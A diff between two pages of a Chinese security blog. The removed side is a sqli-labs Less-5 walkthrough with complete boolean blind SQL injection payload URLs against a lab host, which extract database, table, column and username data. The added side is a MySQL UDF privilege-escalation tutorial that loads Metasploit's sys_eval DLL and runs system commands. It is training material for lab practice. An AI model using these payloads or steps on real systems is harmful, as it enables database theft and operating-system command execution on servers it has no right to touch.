@@ -20,33 +20,23 @@
     var CONFIG = {"hostname":"hzktester.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Less5 我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示一下使用方法。  这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，所以我们不能利用上述 less1-4 的方法  利用left()函数注入1http">
+  <meta name="description" content="什么是UDF库UDF即用户自定义函数。是通过添加新函数，对MYSQL的功能进行补充，就像使用本地MYSQL函数user()和concat()等。 UDF提权步骤查看secure_file_priv的值secure_file_priv 是用来限制 load dumpfile、into  outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限： 使用命令show globa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs靶场Less-5(布尔盲注)">
-<meta property="og:url" content="https://hzktester.top/posts/a1c378af.html">
+<meta property="og:title" content="MySQL UDF提权执行系统命令">
+<meta property="og:url" content="https://hzktester.top/posts/d83e4025.html">
 <meta property="og:site_name" content="Hzktester&#96;s Blog">
-<meta property="og:description" content="Less5 我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示一下使用方法。  这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，所以我们不能利用上述 less1-4 的方法  利用left()函数注入1http">
+<meta property="og:description" content="什么是UDF库UDF即用户自定义函数。是通过添加新函数，对MYSQL的功能进行补充，就像使用本地MYSQL函数user()和concat()等。 UDF提权步骤查看secure_file_priv的值secure_file_priv 是用来限制 load dumpfile、into  outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限： 使用命令show globa">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092308.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092309.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092310.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092311.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092312.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092313.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092314.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092315.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092316.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092317.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092318.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020092319.png">
-<meta property="article:published_time" content="2020-09-23T12:39:00.000Z">
-<meta property="article:modified_time" content="2020-10-20T09:21:51.028Z">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020111501.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020111502.png">
+<meta property="article:published_time" content="2020-11-15T12:33:00.000Z">
+<meta property="article:modified_time" content="2020-11-15T12:35:56.925Z">
 <meta property="article:author" content="hzktester">
-<meta property="article:tag" content="sqli-labs">
+<meta property="article:tag" content="MySQL UDF提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://qiniu.hzktester.top/tp2020092308.png">
+<meta name="twitter:image" content="https://qiniu.hzktester.top/tp2020111501.png">
 
-<link rel="canonical" href="https://hzktester.top/posts/a1c378af.html">
+<link rel="canonical" href="https://hzktester.top/posts/d83e4025.html">
 
 
 <script id="page-configurations">
@@ -59,7 +49,7 @@
   };
 </script>
 
-  <title>sqli-labs靶场Less-5(布尔盲注) | Hzktester`s Blog</title>
+  <title>MySQL UDF提权执行系统命令 | Hzktester`s Blog</title>
   
 
 
@@ -210,7 +200,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/posts/a1c378af.html">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/posts/d83e4025.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -223,7 +213,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sqli-labs靶场Less-5(布尔盲注)
+          MySQL UDF提权执行系统命令
         </h1>
 
         <div class="post-meta">
@@ -233,23 +223,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-09-23 20:39:00" itemprop="dateCreated datePublished" datetime="2020-09-23T20:39:00+08:00">2020-09-23</time>
+              <time title="创建时间：2020-11-15 20:33:00 / 修改时间：20:35:56" itemprop="dateCreated datePublished" datetime="2020-11-15T20:33:00+08:00">2020-11-15</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-20 17:21:51" itemprop="dateModified" datetime="2020-10-20T17:21:51+08:00">2020-10-20</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                  <a href="/categories/%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">提权</span></a>
                 </span>
             </span>
 
@@ -266,7 +250,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.1k</span>
+              <span>3.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -285,57 +269,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><blockquote>
-<p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p>
-</blockquote>
-<p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p>
-<p><img src="https://qiniu.hzktester.top/tp2020092308.png" alt="image"></p>
-<h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
-<p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020092309.png" alt="image"></p>
-<p>当版本号不对的时候，则显示为空</p>
-<p><img src="https://qiniu.hzktester.top/tp2020092310.png" alt="image"></p>
-<p>猜测数据库长度，已知数据库长度为8</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092311.png" alt="image"></p>
-<p>猜测数据库第一位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure>
-<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020092312.png" alt="image"></p>
-<p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092313.png" alt="image"></p>
-<p>往下的举一反三。即可得到完整的数据库名</p>
-<h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p>
-</blockquote>
-<p><img src="https://qiniu.hzktester.top/tp2020092314.png" alt="image"></p>
-<p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092315.png" alt="image"></p>
-<p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092316.png" alt="image"></p>
-<p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p>
-<h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
-<p>payload请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092317.png" alt="image"></p>
-<p>上述语句时选择 users 表中的列名是否有 us**的列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092318.png" alt="image"></p>
-<p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p>
-<h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure>
-<p>payload请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020092319.png" alt="image"></p>
-<p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p>
-<hr>
-<p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>
+        <h2 id="什么是UDF库"><a href="#什么是UDF库" class="headerlink" title="什么是UDF库"></a>什么是UDF库</h2><p><code>UDF</code>即用户自定义函数。是通过添加新函数，对<code>MYSQL</code>的功能进行补充，就像使用本地<code>MYSQL</code>函数<code>user()</code>和<code>concat()</code>等。</p>
+<h2 id="UDF提权步骤"><a href="#UDF提权步骤" class="headerlink" title="UDF提权步骤"></a>UDF提权步骤</h2><h3 id="查看secure-file-priv的值"><a href="#查看secure-file-priv的值" class="headerlink" title="查看secure_file_priv的值"></a>查看<strong>secure_file_priv的值</strong></h3><p><code>secure_file_priv</code> 是用来限制<code> load dumpfile</code>、<code>into  outfile</code>、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限：</p>
+<p>使用命令<code>show global variables like &#39;secure%&#39;</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当 <code>secure_file_priv</code> 的值为 <code>NULL </code>，表示限制 <code>mysqld </code>不允许导入|导出，此时无法提权</li>
+<li>当 <code>secure_file_priv </code>的值为 <code>/tmp/</code> ，表示限制 <code>mysqld </code>的导入|导出只能发生在<code>/tmp/</code> 目录下，此时也无法提权</li>
+<li>当 <code>secure_file_priv</code>的值没有具体值时，表示不对 <code>mysqld</code>的导入|导出做限制，此时可提权</li>
+</ul>
+<p><code>secure_file_priv</code>的值在<code>MySQL</code>数据库的安装目录的 <code>my.ini</code> 文件中配置：<br><img src="https://qiniu.hzktester.top/tp2020111501.png" alt="tp2020111501.png"></p>
+<h3 id="查看系统架构以及plugin目录"><a href="#查看系统架构以及plugin目录" class="headerlink" title="查看系统架构以及plugin目录"></a><strong>查看系统架构以及plugin目录</strong></h3><p>首先，我们分别通过<code>@@ version_compile_os</code>和<code>@@ version_compile_machine</code>，来获取当前数据库及操作系统的架构情况。结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win32                | AMD64                     |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;%compile%&#x27;</span>;</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| Variable_name           | Value |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| version_compile_machine | AMD64 |</span><br><span class="line">| version_compile_os      | Win32 |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>从<code>MySQL 5.0.67</code>开始，<code>UDF</code>库必须包含在<code>plugin</code>文件夹中，我们可以使用<code>@@ plugin_dir</code>全局变量找到该目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| @@plugin_dir                              |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;plugin%&#x27;</span>;</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| Variable_name | Value                                     |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当 <code>MySQL&lt; 5.1</code> 版本时，将 .dll 文件导入到 <code>c:\windows</code> 或者 <code>c:\windows\system32</code> 目录下。</li>
+<li>当 <code>MySQL&gt; 5.1 </code>版本时，将 .dll 文件导入到<code> MySQL Server 5.xx\lib\plugin</code> 目录下 (<code>lib\plugin</code>目录默认不存在，需自行创建)。<h3 id="将dll文件写入plugin目录-并且创建函数"><a href="#将dll文件写入plugin目录-并且创建函数" class="headerlink" title="将dll文件写入plugin目录,并且创建函数"></a><strong>将dll文件写入plugin目录,并且创建函数</strong></h3>我们将使用<code>lib_mysqludf_sys_32.dll</code>的<code>DLL</code>库，你可以在<code>Metasploit</code>框架中找到它。你可以使用基于系统架构的<code>UDF</code>库，它们在<code>Metasploit</code>的安装目录<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>。<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">点击这里</a>查看下载：</li>
+</ul>
+<p>我这里做测试，就直接上传到目录中了：<br><img src="https://qiniu.hzktester.top/tp2020111502.png" alt="tp2020111502.png"><br>创建函数<code>sys_eval</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create <span class="keyword">function</span> sys_eval returns string soname <span class="string">&#x27;lib_mysqludf_sys_32.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="使用系统命令"><a href="#使用系统命令" class="headerlink" title="使用系统命令"></a><strong>使用系统命令</strong></h3><p>在将 <code>udf.dll</code> 文件写入<code>plugin</code>目录后，我们就可以使用 <code>sys_eval</code>函数了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func <span class="built_in">where</span> name = <span class="string">&#x27;sys_eval&#x27;</span>;	<span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| name     | ret | dl                      | <span class="built_in">type</span>     |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| sys_eval |   0 | lib_mysqludf_sys_32.dll | <span class="keyword">function</span> |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);	<span class="comment">#使用系统命令</span></span><br><span class="line">+---------------------------+</span><br><span class="line">| sys_eval(<span class="string">&#x27;whoami&#x27;</span>)        |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 172_27_0_11\administrator |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.06 sec)</span><br></pre></td></tr></table></figure>
+<p>如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用<code>MSF</code>里面的** <strong><code>exploit/multi/mysql/mysql_udf_payload</code></strong> **模块自动注入。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wsnbbz/article/details/104802100">https://blog.csdn.net/wsnbbz/article/details/104802100</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p>
 
     </div>
 
@@ -351,7 +310,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://hzktester.top/posts/a1c378af.html" title="sqli-labs靶场Less-5(布尔盲注)">https://hzktester.top/posts/a1c378af.html</a>
+    <a href="https://hzktester.top/posts/d83e4025.html" title="MySQL UDF提权执行系统命令">https://hzktester.top/posts/d83e4025.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -362,7 +321,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli-labs</a>
+              <a href="/tags/MySQL-UDF%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> MySQL UDF提权</a>
           </div>
 
         
@@ -371,13 +330,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/posts/175b777c.html" rel="prev" title="sqli-labs-Background-2 盲注">
-      <i class="fa fa-chevron-left"></i> sqli-labs-Background-2 盲注
+    <a href="/posts/c0ec548.html" rel="prev" title="正则表达式，字符串的匹配与查找函数，数组切割">
+      <i class="fa fa-chevron-left"></i> 正则表达式，字符串的匹配与查找函数，数组切割
     </a></div>
-      <div class="post-nav-item">
-    <a href="/posts/d416df9e.html" rel="next" title="sqli-labs靶场Less-5(报错盲注)">
-      sqli-labs靶场Less-5(报错盲注) <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -436,7 +392,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less5"><span class="nav-number">1.</span> <span class="nav-text">Less5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8left-%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">利用left()函数注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8substr-ascii-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">利用substr()ascii()注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8regexp%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97"><span class="nav-number">1.3.</span> <span class="nav-text">利用regexp获取users表中的列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ord-%E5%87%BD%E6%95%B0%E5%92%8Cmid-%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96users%E8%A1%A8%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">1.4.</span> <span class="nav-text">利用ord()函数和mid()函数获取users表的内容</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFUDF%E5%BA%93"><span class="nav-number">1.</span> <span class="nav-text">什么是UDF库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">UDF提权步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bsecure-file-priv%E7%9A%84%E5%80%BC"><span class="nav-number">2.1.</span> <span class="nav-text">查看secure_file_priv的值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8Aplugin%E7%9B%AE%E5%BD%95"><span class="nav-number">2.2.</span> <span class="nav-text">查看系统架构以及plugin目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86dll%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5plugin%E7%9B%AE%E5%BD%95-%E5%B9%B6%E4%B8%94%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-number">2.3.</span> <span class="nav-text">将dll文件写入plugin目录,并且创建函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">2.4.</span> <span class="nav-text">使用系统命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">参考链接：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
